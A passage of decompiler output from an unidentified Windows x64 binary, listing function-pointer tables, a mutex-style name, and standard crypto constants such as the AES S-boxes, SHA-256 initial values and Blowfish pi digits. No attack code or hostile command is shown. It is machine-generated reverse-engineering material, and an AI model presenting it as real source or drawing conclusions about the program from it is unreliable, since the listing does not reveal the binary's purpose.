  &sub_1400292B0,
  &sub_140028D74,
  &sub_140028550,
  &sub_140029290,
  &sub_140028934,
  &sub_140028698,
  &sub_140028D9C
}; // weak
_UNKNOWN unk_1400A6B10; // weak
__int64 (__fastcall *off_1400A6B18)(void *) = &sub_140024930; // weak
__int64 (__fastcall *off_1400A6BA8)() = &sub_1400248F0; // weak
_UNKNOWN unk_1400A6BB0; // weak
_UNKNOWN unk_1400A6BB8; // weak
_UNKNOWN unk_1400A6C20; // weak
__int64 (__fastcall *off_1400A6C38)() = &sub_140029610; // weak
__int64 (__fastcall *off_1400A6CD0)(void *) = &sub_14002A250; // weak
__int64 (__fastcall *off_1400A6E78)(void *) = &sub_14002A7F0; // weak
__int64 (__fastcall *off_1400A6EC0)(void *) = &sub_1400194F0; // weak
__int64 (__fastcall *off_1400A6ED8)() = &sub_140011D20; // weak
__int64 (__fastcall *off_1400A6F50)(void *) = &sub_14002B660; // weak
__int64 (__fastcall *off_1400A70A0)(void *) = &sub_14002BCB0; // weak
__int64 (__fastcall *off_1400A70C0)(void *) = &sub_14002BCB0; // weak
__int64 (__fastcall *off_1400A72F0[2])() = { &sub_14002C900, &nullsub_1 }; // weak
__int64 (__fastcall *off_1400A7300[2])(void *) = { &sub_14002C790, &sub_14002C750 }; // weak
__int64 (__fastcall *off_1400A7308)(void *) = &sub_14002C750; // weak
__int64 (__fastcall *off_1400A7318[2])() = { &sub_14002C740, &sub_14002CAC8 }; // weak
__int64 (__fastcall *off_1400A7320)() = &sub_14002CAC8; // weak
_UNKNOWN unk_1400A7338; // weak
_UNKNOWN unk_1400A7480; // weak
__int64 (__fastcall *off_1400A7528)() = &sub_140011D20; // weak
_UNKNOWN unk_1400A75A0; // weak
_UNKNOWN unk_1400A75A4; // weak
_UNKNOWN unk_1400A75A8; // weak
_UNKNOWN unk_1400A75AC; // weak
_UNKNOWN unk_1400A75B0; // weak
_UNKNOWN unk_1400A75B4; // weak
_UNKNOWN unk_1400A75B8; // weak
__int64 (__fastcall *off_1400A7728[2])() = { &sub_140003E90, &sub_140030BE0 }; // weak
__int64 (__fastcall *off_1400A7758[2])() = { &sub_140003E90, &sub_140030BF0 }; // weak
__int16 word_1400A7850 = 47; // weak
__int64 (__fastcall *off_1400A7D00)(void *) = &sub_140033780; // weak
__int128 xmmword_1400A81C0 = 0x2D32453033373531437B5C6C61636F4Ci64; // weak
__int128 xmmword_1400A81D0 = 0x332D353030422D653563342D43353431i64; // weak
__int128 xmmword_1400A81E0 = 0x636E6F2D7D3537343234463335374342i64; // weak
__int64 (__fastcall *off_1400A8798)(void *) = &unknown_libname_5; // weak
__int64 (__fastcall *off_1400A87C8)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400A8928)(void *) = &sub_140037320; // weak
__int64 (__fastcall *off_1400A8940)() = &sub_140089010; // weak
_UNKNOWN unk_1400A8AA0; // weak
__int64 (__fastcall *off_1400A8AB8[3])() = { &sub_140089010, &sub_140050CE0, &sub_140089010 }; // weak
int dword_1400A8B28[10] = { 2, 2, 2, 4, 4, 8, 8, 8, 8, 0 }; // idb
__int64 (__fastcall *off_1400A9910)(void *) = &sub_14003D9F0; // weak
__int64 (__fastcall *off_1400A9930)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400A9A98[3])() = { &sub_140037308, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400A9AC0)(void *) = &sub_14005F940; // weak
__int64 (__fastcall *off_1400A9C28)(void *) = &sub_14005F970; // weak
__int64 (__fastcall *off_1400A9DA8)(void *) = &sub_14003D990; // weak
_UNKNOWN unk_1400A9E68; // weak
_UNKNOWN unk_1400A9E6C; // weak
__int64 (__fastcall *off_1400A9EA0)(void *) = &sub_14003D940; // weak
_UNKNOWN unk_1400AA008; // weak
__int64 (__fastcall *off_1400AA028)(void *) = &sub_140024AE0; // weak
__int128 xmmword_1400AA040 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFi64; // weak
_UNKNOWN unk_1400AA050; // weak
_UNKNOWN unk_1400AAB58; // weak
__int64 (__fastcall *off_1400AABC0)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400AABD8)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400AAD38)(void *) = &sub_14004E650; // weak
__int64 (__fastcall *off_1400AAED0[7])() =
{
  &sub_14004E478,
  &sub_1400388F0,
  &sub_1400389A0,
  &sub_140089010,
  &sub_14005FB90,
  &sub_140060300,
  &sub_140025510
}; // weak
__int64 (__fastcall *off_1400AAEE8[4])() = { &sub_140089010, &sub_14005FB90, &sub_140060300, &sub_140025510 }; // weak
__int64 (__fastcall *off_1400AAF30)() = &sub_14004E484; // weak
__int64 (__fastcall *off_1400AAF88)(void *) = &sub_14004E5E0; // weak
__int64 (__fastcall *off_1400AB048)(void *) = &sub_14004E570; // weak
__int64 (__fastcall *off_1400AB1C8[3])() = { &sub_14004E46C, &sub_1400388F0, &sub_1400389A0 }; // weak
_UNKNOWN unk_1400AB1E0; // weak
__int64 (__fastcall *off_1400AB2A0[2])() = { &sub_14004E460, &sub_14004F320 }; // weak
_UNKNOWN unk_1400AB2F0; // weak
__int64 (__fastcall *off_1400AB2F8)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400AB338)(void *) = &sub_140053D60; // weak
__int64 (__fastcall *off_1400AB398)() = &sub_140067D70; // weak
__int64 (__fastcall *off_1400AB4E8)() = &sub_140054870; // weak
__int64 (__fastcall *off_1400AB728)() = &sub_140089010; // weak
char aModulus[8] = "Modulus"; // weak
__int64 (__fastcall *off_1400AB808)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400AB968)(void *) = &sub_140056770; // weak
__int64 (__fastcall *off_1400ABAC8[3])() = { &sub_14005675C, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400ABF78)(void *) = &sub_1400582F0; // weak
__int64 (__fastcall *off_1400AC138[3])() = { &sub_1400582B8, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400AC150)(void *) = &sub_140058390; // weak
__int64 (__fastcall *off_1400AC310[3])() = { &sub_1400582D0, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400AC328)(void *) = &sub_140058360; // weak
__int64 (__fastcall *off_1400AC4A0[3])() = { &sub_1400582C4, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400AC4B8)(void *) = &sub_140058430; // weak
__int64 (__fastcall *off_1400AC678[4])() = { &sub_1400582DC, &sub_1400388F0, &sub_1400389A0, &sub_140089010 }; // weak
__int64 (__fastcall *off_1400AC690)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400AC7F0)(void *) = &sub_14007B410; // weak
__int64 (__fastcall *off_1400AC9B0[3])() = { &sub_14007B2EC, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400ACA58)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400ACA70)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400ACF80)() = &sub_14005F91C; // weak
__int64 (__fastcall *off_1400ACF98)() = &sub_14005F928; // weak
__int64 (__fastcall *off_1400AD0A0)() = &sub_140089010; // weak
__int128 xmmword_1400AD230 = 0xC0D0E0F08090A0B0405060700010203i64; // weak
_UNKNOWN unk_1400AD300; // weak
__int128 xmmword_1400AD5C0 = 0xA54FF53A3C6EF372BB67AE856A09E667i64; // weak
__int128 xmmword_1400AD5D0 = 0x5BE0CD191F83D9AB9B05688C510E527Fi64; // weak
__int128 xmmword_1400AD5E0 = 0x1000000000000000000000000000000i64; // weak
_UNKNOWN unk_1400AD61C; // weak
__int64 (__fastcall *off_1400AD900)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400ADA48)(void *) = &sub_140068850; // weak
__int64 (__fastcall *off_1400ADBA8[3])() = { &sub_140068844, &sub_1400388F0, &sub_1400389A0 }; // weak
unsigned __int8 byte_1400ADBC0[512] =
{
  99u,
  124u,
  119u,
  123u,
  242u,
  107u,
  111u,
  197u,
  48u,
  1u,
  103u,
  43u,
  254u,
  215u,
  171u,
  118u,
  202u,
  130u,
  201u,
  125u,
  250u,
  89u,
  71u,
  240u,
  173u,
  212u,
  162u,
  175u,
  156u,
  164u,
  114u,
  192u,
  183u,
  253u,
  147u,
  38u,
  54u,
  63u,
  247u,
  204u,
  52u,
  165u,
  229u,
  241u,
  113u,
  216u,
  49u,
  21u,
  4u,
  199u,
  35u,
  195u,
  24u,
  150u,
  5u,
  154u,
  7u,
  18u,
  128u,
  226u,
  235u,
  39u,
  178u,
  117u,
  9u,
  131u,
  44u,
  26u,
  27u,
  110u,
  90u,
  160u,
  82u,
  59u,
  214u,
  179u,
  41u,
  227u,
  47u,
  132u,
  83u,
  209u,
  0u,
  237u,
  32u,
  252u,
  177u,
  91u,
  106u,
  203u,
  190u,
  57u,
  74u,
  76u,
  88u,
  207u,
  208u,
  239u,
  170u,
  251u,
  67u,
  77u,
  51u,
  133u,
  69u,
  249u,
  2u,
  127u,
  80u,
  60u,
  159u,
  168u,
  81u,
  163u,
  64u,
  143u,
  146u,
  157u,
  56u,
  245u,
  188u,
  182u,
  218u,
  33u,
  16u,
  255u,
  243u,
  210u,
  205u,
  12u,
  19u,
  236u,
  95u,
  151u,
  68u,
  23u,
  196u,
  167u,
  126u,
  61u,
  100u,
  93u,
  25u,
  115u,
  96u,
  129u,
  79u,
  220u,
  34u,
  42u,
  144u,
  136u,
  70u,
  238u,
  184u,
  20u,
  222u,
  94u,
  11u,
  219u,
  224u,
  50u,
  58u,
  10u,
  73u,
  6u,
  36u,
  92u,
  194u,
  211u,
  172u,
  98u,
  145u,
  149u,
  228u,
  121u,
  231u,
  200u,
  55u,
  109u,
  141u,
  213u,
  78u,
  169u,
  108u,
  86u,
  244u,
  234u,
  101u,
  122u,
  174u,
  8u,
  186u,
  120u,
  37u,
  46u,
  28u,
  166u,
  180u,
  198u,
  232u,
  221u,
  116u,
  31u,
  75u,
  189u,
  139u,
  138u,
  112u,
  62u,
  181u,
  102u,
  72u,
  3u,
  246u,
  14u,
  97u,
  53u,
  87u,
  185u,
  134u,
  193u,
  29u,
  158u,
  225u,
  248u,
  152u,
  17u,
  105u,
  217u,
  142u,
  148u,
  155u,
  30u,
  135u,
  233u,
  206u,
  85u,
  40u,
  223u,
  140u,
  161u,
  137u,
  13u,
  191u,
  230u,
  66u,
  104u,
  65u,
  153u,
  45u,
  15u,
  176u,
  84u,
  187u,
  22u,
  82u,
  9u,
  106u,
  213u,
  48u,
  54u,
  165u,
  56u,
  191u,
  64u,
  163u,
  158u,
  129u,
  243u,
  215u,
  251u,
  124u,
  227u,
  57u,
  130u,
  155u,
  47u,
  255u,
  135u,
  52u,
  142u,
  67u,
  68u,
  196u,
  222u,
  233u,
  203u,
  84u,
  123u,
  148u,
  50u,
  166u,
  194u,
  35u,
  61u,
  238u,
  76u,
  149u,
  11u,
  66u,
  250u,
  195u,
  78u,
  8u,
  46u,
  161u,
  102u,
  40u,
  217u,
  36u,
  178u,
  118u,
  91u,
  162u,
  73u,
  109u,
  139u,
  209u,
  37u,
  114u,
  248u,
  246u,
  100u,
  134u,
  104u,
  152u,
  22u,
  212u,
  164u,
  92u,
  204u,
  93u,
  101u,
  182u,
  146u,
  108u,
  112u,
  72u,
  80u,
  253u,
  237u,
  185u,
  218u,
  94u,
  21u,
  70u,
  87u,
  167u,
  141u,
  157u,
  132u,
  144u,
  216u,
  171u,
  0u,
  140u,
  188u,
  211u,
  10u,
  247u,
  228u,
  88u,
  5u,
  184u,
  179u,
  69u,
  6u,
  208u,
  44u,
  30u,
  143u,
  202u,
  63u,
  15u,
  2u,
  193u,
  175u,
  189u,
  3u,
  1u,
  19u,
  138u,
  107u,
  58u,
  145u,
  17u,
  65u,
  79u,
  103u,
  220u,
  234u,
  151u,
  242u,
  207u,
  206u,
  240u,
  180u,
  230u,
  115u,
  150u,
  172u,
  116u,
  34u,
  231u,
  173u,
  53u,
  133u,
  226u,
  249u,
  55u,
  232u,
  28u,
  117u,
  223u,
  110u,
  71u,
  241u,
  26u,
  113u,
  29u,
  41u,
  197u,
  137u,
  111u,
  183u,
  98u,
  14u,
  170u,
  24u,
  190u,
  27u,
  252u,
  86u,
  62u,
  75u,
  198u,
  210u,
  121u,
  32u,
  154u,
  219u,
  192u,
  254u,
  120u,
  205u,
  90u,
  244u,
  31u,
  221u,
  168u,
  51u,
  136u,
  7u,
  199u,
  49u,
  177u,
  18u,
  16u,
  89u,
  39u,
  128u,
  236u,
  95u,
  96u,
  81u,
  127u,
  169u,
  25u,
  181u,
  74u,
  13u,
  45u,
  229u,
  122u,
  159u,
  147u,
  201u,
  156u,
  239u,
  160u,
  224u,
  59u,
  77u,
  174u,
  42u,
  245u,
  176u,
  200u,
  235u,
  187u,
  60u,
  131u,
  83u,
  153u,
  97u,
  23u,
  43u,
  4u,
  126u,
  186u,
  119u,
  214u,
  38u,
  225u,
  105u,
  20u,
  99u,
  85u,
  33u,
  12u,
  125u
}; // idb
_UNKNOWN unk_1400ADDC4; // weak
__int64 (__fastcall *off_1400AE4C0)(void *) = &sub_14006C950; // weak
__int64 (__fastcall *off_1400AE520)() = &sub_14006C904; // weak
_UNKNOWN unk_1400AE528; // weak
char aRue[4] = "rue"; // weak
char aAlse[5] = "alse"; // weak
char aUll[4] = "ull"; // weak
__int64 (__fastcall *off_1400AEE38)() = &sub_14006F614; // weak
_UNKNOWN unk_1400AEE40; // weak
_UNKNOWN unk_1400AF090; // weak
__int64 (__fastcall *off_1400AF3B8)(void *) = &sub_140074810; // weak
__int64 (__fastcall *off_1400AF400)() = &sub_140074F20; // weak
__int64 (__fastcall *off_1400AF560)() = &sub_1400763C0; // weak
__int64 (__fastcall *off_1400AF6F8)() = &sub_140076C40; // weak
__int64 (__fastcall *off_1400AF718)(void *) = &sub_140076C10; // weak
__int64 (__fastcall *off_1400AF738)(void *) = &sub_1400194F0; // weak
__int64 (__fastcall *off_1400AFA28)(void *) = &sub_1400783D0; // weak
__int64 (__fastcall *off_1400AFE60)(void *) = &sub_14007B440; // weak
__int64 (__fastcall *off_1400AFFE0[3])() = { &sub_14007B2F8, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400AFFF8)(void *) = &sub_14007B4B0; // weak
__int64 (__fastcall *off_1400B0170[3])() = { &sub_14007B304, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400B0188)(void *) = &sub_14007B410; // weak
__int64 (__fastcall *off_1400B0348)(void *) = &sub_14007B3A0; // weak
__int64 (__fastcall *off_1400B04C8[3])() = { &sub_14007B2E0, &sub_1400388F0, &sub_1400389A0 }; // weak
__int64 (__fastcall *off_1400B04E0)(void *) = &sub_140088D10; // weak
__int64 (__fastcall *off_1400B0558[2])() = { &sub_140088C78, &sub_14007B6D0 }; // weak
__int64 (__fastcall *off_1400B05A8)(void *) = &sub_14007B370; // weak
__int64 (__fastcall *off_1400B0648)() = &sub_14007B2C8; // weak
__int64 (__fastcall *off_1400B06B8)(void *) = &sub_14007B340; // weak
__int64 (__fastcall *off_1400B0758)() = &sub_14007B2B0; // weak
__int64 (__fastcall *off_1400B07C8[6])() =
{
  &sub_14007B2BC,
  &sub_14007BB80,
  &sub_140050C90,
  &sub_14007BBA0,
  &sub_140066AB0,
  &sub_14007B610
}; // weak
__int64 (__fastcall *off_1400B0810)(void *) = &sub_14007B370; // weak
__int64 (__fastcall *off_1400B08B0)() = &sub_14007B2C8; // weak
__int64 (__fastcall *off_1400B0920[6])() =
{
  &sub_14007B2D4,
  &sub_14007BB80,
  &sub_140050C90,
  &sub_14007BBA0,
  &sub_140066AB0,
  &sub_14007B610
}; // weak
__int64 (__fastcall *off_1400B0968)(void *) = &sub_14007B310; // weak
__int64 (__fastcall *off_1400B0A08)() = &sub_14007B298; // weak
__int64 (__fastcall *off_1400B0A78[6])() =
{
  &sub_14007B2A4,
  &sub_14007BB80,
  &sub_140050C90,
  &sub_14007BBA0,
  &sub_140066AB0,
  &sub_14007B610
}; // weak
__int64 (__fastcall *off_1400B0CC8)() = &sub_14007C8F0; // weak
__int64 (__fastcall *off_1400B0D20)(void *) = &sub_14007C920; // weak
__int64 (__fastcall *off_1400B0D78)() = &sub_14007E2C0; // weak
__int64 (__fastcall *off_1400B0E50)() = &sub_14007E2C0; // weak
__int64 (__fastcall *off_1400B0E60)(void *) = &sub_14007E250; // weak
__int64 (__fastcall *off_1400B0EE8)(void *) = &sub_14007E9D0; // weak
__int64 (__fastcall *off_1400B0F98)(void *) = &sub_14007EF50; // weak
__int64 (__fastcall *off_1400B0FA8)() = &unknown_libname_7; // weak
__int64 (__fastcall *off_1400B1040)(void *) = &sub_14007F7F0; // weak
__int64 (__fastcall *off_1400B1488)(void *) = &sub_140024AE0; // weak
__int128 xmmword_1400B14A0 = 0x370734413198A2E85A308D3243F6A88i64; // weak
__int128 xmmword_1400B14B0 = 0xEC4E6C89082EFA98299F31D0A4093822i64; // weak
__int128 xmmword_1400B14C0 = 0x34E90C6CBE5466CF38D01377452821E6i64; // weak
__int128 xmmword_1400B14D0 = 0xB54709173F84D5B5C97C50DDC0AC29B7i64; // weak
_UNKNOWN unk_1400B14F0; // weak
__int64 (__fastcall *off_1400B2C20)(void *) = &sub_140089030; // weak
__int64 (__fastcall *off_1400B2C60[17])() =
{
  &sub_140088CF0,
  &sub_14005FB90,
  &sub_140060300,
  &sub_140025510,
  &sub_14008CE50,
  &sub_14004E990,
  &sub_14004F540,
  &sub_14008CD10,
  &sub_14008CDB0,
  &sub_140088CFC,
  &sub_14008CE90,
  &sub_14008CA70,
  &sub_14008CF60,
  &sub_1400292B0,
  &sub_14008B6C0,
  &sub_14008B3E4,
  &sub_140050CE0
}; // weak
__int64 (__fastcall *off_1400B2CA8[8])() =
{
  &sub_140088CFC,
  &sub_14008CE90,
  &sub_14008CA70,
  &sub_14008CF60,
  &sub_1400292B0,
  &sub_14008B6C0,
  &sub_14008B3E4,
  &sub_140050CE0
}; // weak
_UNKNOWN unk_1400B2D00; // weak
__int64 (__fastcall *off_1400B2D98[2])() = { &sub_140088C78, &sub_140089550 }; // weak
__int64 (__fastcall *off_1400B2EE0)(void *) = &sub_14004E490; // weak
__int64 (__fastcall *off_1400B2F58[2])() = { &sub_14004E460, &sub_140089650 }; // weak
__int64 (__fastcall *off_1400B30A0)(void *) = &sub_140088E20; // weak
__int64 (__fastcall *off_1400B3118[2])() = { &sub_140088C9C, &sub_140089770 }; // weak
__int64 (__fastcall *off_1400B3260)(void *) = &sub_140088DD0; // weak
__int64 (__fastcall *off_1400B32D8[2])() = { &sub_140088C90, &sub_1400896E0 }; // weak
__int64 (__fastcall *off_1400B3420)(void *) = &sub_140088D80; // weak
__int64 (__fastcall *off_1400B3498[2])() = { &sub_140088C84, &sub_1400895C0 }; // weak
__int64 (__fastcall *off_1400B35E0)(void *) = &sub_140088F80; // weak
__int64 (__fastcall *off_1400B3688)() = &sub_140088CE4; // weak
__int64 (__fastcall *off_1400B36C0)() = &sub_14008B360; // weak
unsigned __int8 byte_1400B3880[252] =
{
  112u,
  130u,
  44u,
  236u,
  179u,
  39u,
  192u,
  229u,
  228u,
  133u,
  87u,
  53u,
  234u,
  12u,
  174u,
  65u,
  35u,
  239u,
  107u,
  147u,
  69u,
  25u,
  165u,
  33u,
  237u,
  14u,
  79u,
  78u,
  29u,
  101u,
  146u,
  189u,
  134u,
  184u,
  175u,
  143u,
  124u,
  235u,
  31u,
  206u,
  62u,
  48u,
  220u,
  95u,
  94u,
  197u,
  11u,
  26u,
  166u,
  225u,
  57u,
  202u,
  213u,
  71u,
  93u,
  61u,
  217u,
  1u,
  90u,
  214u,
  81u,
  86u,
  108u,
  77u,
  139u,
  13u,
  154u,
  102u,
  251u,
  204u,
  176u,
  45u,
  116u,
  18u,
  43u,
  32u,
  240u,
  177u,
  132u,
  153u,
  223u,
  76u,
  203u,
  194u,
  52u,
  126u,
  118u,
  5u,
  109u,
  183u,
  169u,
  49u,
  209u,
  23u,
  4u,
  215u,
  20u,
  88u,
  58u,
  97u,
  222u,
  27u,
  17u,
  28u,
  50u,
  15u,
  156u,
  22u,
  83u,
  24u,
  242u,
  34u,
  254u,
  68u,
  207u,
  178u,
  195u,
  181u,
  122u,
  145u,
  36u,
  8u,
  232u,
  168u,
  96u,
  252u,
  105u,
  80u,
  170u,
  208u,
  160u,
  125u,
  161u,
  137u,
  98u,
  151u,
  84u,
  91u,
  30u,
  149u,
  224u,
  255u,
  100u,
  210u,
  16u,
  196u,
  0u,
  72u,
  163u,
  247u,
  117u,
  219u,
  138u,
  3u,
  230u,
  218u,
  9u,
  63u,
  221u,
  148u,
  135u,
  92u,
  131u,
  2u,
  205u,
  74u,
  144u,
  51u,
  115u,
  103u,
  246u,
  243u,
  157u,
  127u,
  191u,
  226u,
  82u,
  155u,
  216u,
  38u,
  200u,
  55u,
  198u,
  59u,
  129u,
  150u,
  111u,
  75u,
  19u,
  190u,
  99u,
  46u,
  233u,
  121u,
  167u,
  140u,
  159u,
  110u,
  188u,
  142u,
  41u,
  245u,
  249u,
  182u,
  47u,
  253u,
  180u,
  89u,
  120u,
  152u,
  6u,
  106u,
  231u,
  70u,
  113u,
  186u,
  212u,
  37u,
  171u,
  66u,
  136u,
  162u,
  141u,
  250u,
  114u,
  7u,
  185u,
  85u,
  248u,
  238u,
  172u,
  10u,
  54u,
  73u,
  42u,
  104u,
  60u,
  56u,
  241u,
  164u,
  64u,
  40u,
  211u,
  123u,
  187u,
  201u,
  67u,
  193u,
  21u,
  227u,
  173u,
  244u
}; // idb
int dword_1400B3980[256] =
{
  1886416896,
  2189591040,
  741092352,
  3974949888,
  3014898432,
  656877312,
  3233857536,
  3857048832,
  3840205824,
  2240120064,
  1465341696,
  892679424,
  3941263872,
  202116096,
  2930683392,
  1094795520,
  589505280,
  4025478912,
  1802201856,
  2475922176,
  1162167552,
  421075200,
  2779096320,
  555819264,
  3991792896,
  235802112,
  1330597632,
  1313754624,
  488447232,
  1701143808,
  2459079168,
  3183328512,
  2256963072,
  3099113472,
  2947526400,
  2408550144,
  2088532992,
  3958106880,
  522133248,
  3469659648,
  1044266496,
  808464384,
  3705461760,
  1600085760,
  1583242752,
  3318072576,
  185273088,
  437918208,
  2795939328,
  3789676800,
  960051456,
  3402287616,
  3587560704,
  1195853568,
  1566399744,
  1027423488,
  3654932736,
  16843008,
  1515870720,
  3604403712,
  1364283648,
  1448498688,
  1819044864,
  1296911616,
  2341178112,
  218959104,
  2593823232,
  1717986816,
  4227595008,
  3435973632,
  2964369408,
  757935360,
  1953788928,
  303174144,
  724249344,
  538976256,
  4042321920,
  2981212416,
  2223277056,
  2576980224,
  3755990784,
  1280068608,
  3419130624,
  3267543552,
  875836416,
  2122219008,
  1987474944,
  84215040,
  1835887872,
  3082270464,
  2846468352,
  825307392,
  3520188672,
  387389184,
  67372032,
  3621246720,
  336860160,
  1482184704,
  976894464,
  1633771776,
  3739147776,
  454761216,
  286331136,
  471604224,
  842150400,
  252645120,
  2627509248,
  370546176,
  1397969664,
  404232192,
  4076007936,
  572662272,
  4278124032,
  1145324544,
  3486502656,
  2998055424,
  3284386560,
  3048584448,
  2054846976,
  2442236160,
  606348288,
  134744064,
  3907577856,
  2829625344,
  1616928768,
  4244438016,
  1768515840,
  1347440640,
  2863311360,
  3503345664,
  2694881280,
  2105376000,
  2711724288,
  2307492096,
  1650614784,
  2543294208,
  1414812672,
  1532713728,
  505290240,
  2509608192,
  3772833792,
  4294967040,
  1684300800,
  3537031680,
  269488128,
  3301229568,
  0,
  1212696576,
  2745410304,
  4160222976,
  1970631936,
  3688618752,
  2324335104,
  50529024,
  3873891840,
  3671775744,
  151587072,
  1061109504,
  3722304768,
  2492765184,
  2273806080,
  1549556736,
  2206434048,
  33686016,
  3452816640,
  1246382592,
  2425393152,
  858993408,
  1936945920,
  1734829824,
  4143379968,
  4092850944,
  2644352256,
  2139062016,
  3217014528,
  3806519808,
  1381126656,
  2610666240,
  3638089728,
  640034304,
  3368601600,
  926365440,
  3334915584,
  993737472,
  2172748032,
  2526451200,
  1869573888,
  1263225600,
  320017152,
  3200171520,
  1667457792,
  774778368,
  3924420864,
  2038003968,
  2812782336,
  2358021120,
  2678038272,
  1852730880,
  3166485504,
  2391707136,
  690563328,
  4126536960,
  4193908992,
  3065427456,
  791621376,
  4261281024,
  3031741440,
  1499027712,
  2021160960,
  2560137216,
  101058048,
  1785358848,
  3890734848,
  1179010560,
  1903259904,
  3132799488,
  3570717696,
  623191296,
  2880154368,
  1111638528,
  2290649088,
  2728567296,
  2374864128,
  4210752000,
  1920102912,
  117901056,
  3115956480,
  1431655680,
  4177065984,
  4008635904,
  2896997376,
  168430080,
  909522432,
  1229539584,
  707406336,
  1751672832,
  1010580480,
  943208448,
  4059164928,
  2762253312,
  1077952512,
  673720320,
  3553874688,
  2071689984,
  3149642496,
  3385444608,
  1128481536,
  3250700544,
  353703168,
  3823362816,
  2913840384,
  4109693952,
  2004317952,
  3351758592,
  2155905024,
  2661195264
}; // idb
int dword_1400B3D80[256] =
{
  14737632,
  328965,
  5789784,
  14277081,
  6776679,
  5131854,
  8487297,
  13355979,
  13224393,
  723723,
  11447982,
  6974058,
  14013909,
  1579032,
  6118749,
  8553090,
  4605510,
  14671839,
  14079702,
  2565927,
  9079434,
  3289650,
  4934475,
  4342338,
  14408667,
  1842204,
  10395294,
  10263708,
  3815994,
  13290186,
  2434341,
  8092539,
  855309,
  7434609,
  6250335,
  2039583,
  16316664,
  14145495,
  4079166,
  10329501,
  8158332,
  6316128,
  12171705,
  12500670,
  12369084,
  9145227,
  1447446,
  3421236,
  5066061,
  12829635,
  7500402,
  9803157,
  11250603,
  9342606,
  12237498,
  8026746,
  11776947,
  131586,
  11842740,
  11382189,
  10658466,
  11316396,
  14211288,
  10132122,
  1513239,
  1710618,
  3487029,
  13421772,
  16250871,
  10066329,
  6381921,
  5921370,
  15263976,
  2368548,
  5658198,
  4210752,
  14803425,
  6513507,
  592137,
  3355443,
  12566463,
  10000536,
  9934743,
  8750469,
  6842472,
  16579836,
  15527148,
  657930,
  14342874,
  7303023,
  5460819,
  6447714,
  10724259,
  3026478,
  526344,
  11513775,
  2631720,
  11579568,
  7631988,
  12763842,
  12434877,
  3552822,
  2236962,
  3684408,
  6579300,
  1973790,
  3750201,
  2894892,
  10921638,
  3158064,
  15066597,
  4473924,
  16645629,
  8947848,
  10461087,
  6645093,
  8882055,
  7039851,
  16053492,
  2302755,
  4737096,
  1052688,
  13750737,
  5329233,
  12632256,
  16382457,
  13816530,
  10526880,
  5592405,
  10592673,
  4276545,
  16448250,
  4408131,
  1250067,
  12895428,
  3092271,
  11053224,
  11974326,
  3947580,
  2829099,
  12698049,
  16777215,
  13158600,
  10855845,
  2105376,
  9013641,
  0,
  9474192,
  4671303,
  15724527,
  15395562,
  12040119,
  1381653,
  394758,
  13487565,
  11908533,
  1184274,
  8289918,
  12303291,
  2697513,
  986895,
  12105912,
  460551,
  263172,
  10197915,
  9737364,
  2171169,
  6710886,
  15132390,
  13553358,
  15592941,
  15198183,
  3881787,
  16711422,
  8355711,
  12961221,
  10790052,
  3618615,
  11645361,
  5000268,
  9539985,
  7237230,
  9276813,
  7763574,
  197379,
  2960685,
  14606046,
  9868950,
  2500134,
  8224125,
  13027014,
  6052956,
  13882323,
  15921906,
  5197647,
  1644825,
  4144959,
  14474460,
  7960953,
  1907997,
  5395026,
  15461355,
  15987699,
  7171437,
  6184542,
  16514043,
  6908265,
  11711154,
  15790320,
  3223857,
  789516,
  13948116,
  13619151,
  9211020,
  14869218,
  7697781,
  11119017,
  4868682,
  5723991,
  8684676,
  1118481,
  4539717,
  1776411,
  16119285,
  15000804,
  921102,
  7566195,
  11184810,
  15856113,
  14540253,
  5855577,
  1315860,
  7105644,
  9605778,
  5526612,
  13684944,
  7895160,
  7368816,
  14935011,
  4802889,
  8421504,
  5263440,
  10987431,
  16185078,
  7829367,
  9671571,
  8816262,
  8618883,
  2763306,
  13092807,
  5987163,
  15329769,
  15658734,
  9408399,
  65793,
  4013373
}; // idb
int dword_1400B4180[256] =
{
  939538488,
  1090535745,
  369104406,
  1979741814,
  3640711641,
  2466288531,
  1610637408,
  4060148466,
  1912631922,
  3254829762,
  2868947883,
  2583730842,
  1962964341,
  100664838,
  1459640151,
  2684395680,
  2432733585,
  4144035831,
  3036722613,
  3372272073,
  2717950626,
  2348846220,
  3523269330,
  2415956112,
  4127258358,
  117442311,
  2801837991,
  654321447,
  2382401166,
  2986390194,
  1224755529,
  3724599006,
  1124090691,
  1543527516,
  3607156695,
  3338717127,
  1040203326,
  4110480885,
  2399178639,
  1728079719,
  520101663,
  402659352,
  1845522030,
  2936057775,
  788541231,
  3791708898,
  2231403909,
  218107149,
  1392530259,
  4026593520,
  2617285788,
  1694524773,
  3925928682,
  2734728099,
  2919280302,
  2650840734,
  3959483628,
  2147516544,
  754986285,
  1795189611,
  2818615464,
  721431339,
  905983542,
  2785060518,
  3305162181,
  2248181382,
  1291865421,
  855651123,
  4244700669,
  1711302246,
  1476417624,
  2516620950,
  973093434,
  150997257,
  2499843477,
  268439568,
  2013296760,
  3623934168,
  1107313218,
  3422604492,
  4009816047,
  637543974,
  3842041317,
  1627414881,
  436214298,
  1056980799,
  989870907,
  2181071490,
  3053500086,
  3674266587,
  3556824276,
  2550175896,
  3892373736,
  2332068747,
  33554946,
  3942706155,
  167774730,
  738208812,
  486546717,
  2952835248,
  1862299503,
  2365623693,
  2281736328,
  234884622,
  419436825,
  2264958855,
  1308642894,
  184552203,
  2835392937,
  201329676,
